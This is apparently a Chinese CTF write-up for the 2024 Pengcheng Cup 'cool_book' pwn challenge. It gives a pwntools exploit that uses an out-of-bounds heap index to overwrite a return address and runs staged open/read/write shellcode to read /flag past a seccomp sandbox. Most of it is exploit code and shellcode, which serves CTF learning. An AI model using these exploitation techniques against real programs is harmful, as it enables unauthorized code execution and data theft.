---
title: 2024 鹏程杯 writeup by Mini-Venom（cool_book 沙箱 ORW）
contest: 2024 鹏程杯
year: 2024
difficulty: hard
vuln_type: [rop, srop, shellcode]
tags: [cool_book 50 块后越界, v6 溢出覆盖返回地址, seccomp 沙箱手写 ORW, shellcraft.open+read+write pwntools, mov rdi,0; mov rsi,rbp; pop rax; pop rcx; pop rdx; syscall, heap_base 0x910-0x9a0 写 shellcode]
attack_chain:
  - 50 个堆块 add 后越界覆盖 v6
  - v6 是返回地址 → 覆盖为堆地址
  - 堆地址处写 shellcode（手写 ORW）
  - 开了 seccomp → 不能 execve，只能 ORW
  - add 50 次后 add(49, asm('mov rdi,0;mov rsi,rbp;pop rax;pop rcx;pop rdx;syscall'))
  - 触发 ROP → 跳到 shellcode
key_payload: "asm('mov rdi,0;mov rsi,rbp;pop rax;pop rcx;pop rdx;syscall')"
one_liner: cool_book 50 块后 v6 越界覆盖返回地址到堆地址 + 堆上写 ORW shellcode，seccomp 禁 execve → 走手写 open/read/write。
lesson: 开了 seccomp 的 pwn 题，syscall 只留 read/write/open 等几条 → 必须在堆上写 ORW shellcode，pwntools `shellcraft.open/read/write` 是最简方案；add 50 次后 v6 越界是经典菜单题 off-by-N 套路。
quality: high
---

# 2024 鹏程杯 cool_book

```python
def add(idx, content):
    sla(b'3.exit\n', b'1')
    sla(b'input idx\n', str(idx))
    sa(b'input content\n', content)
```

50 块 add 后返回 main 时，`v6` 数组下标越界 → 覆盖返回地址为堆地址。  
堆地址 `heap_base+0x910` 起写 shellcode：

```python
# 47 块前先 leak heap_base
rl(b'addr=')
heap_base = int16(r(14))

for i in range(46):
    add(i, b'\x90' * 0x1)

sc = shellcraft.open('/flag')
sc += shellcraft.read(3, heap_base-0x100, 0x30)
sc += shellcraft.write(1, heap_base-0x100, 0x30)

add(46, b'\x90' * 0x1)  # heap_base+0x910
add(47, b'\x90' * 0x1)  # heap_base+0x940
add(48, b'\x90' * 0x1)  # heap_base+0x940
add(49, asm('mov rdi,0;mov rsi,rbp;pop rax;pop rcx;pop rdx;syscall'))  # heap_base+0x9a0

# 触发
sla(b'3.exit\n', b'3')
sleep(2)
s(b'\x90' * 0x40 + asm(sc))
```

开了 seccomp，只能 `open('/flag')` → `read(3, heap_base-0x100, 0x30)` → `write(1, heap_base-0x100, 0x30)`。
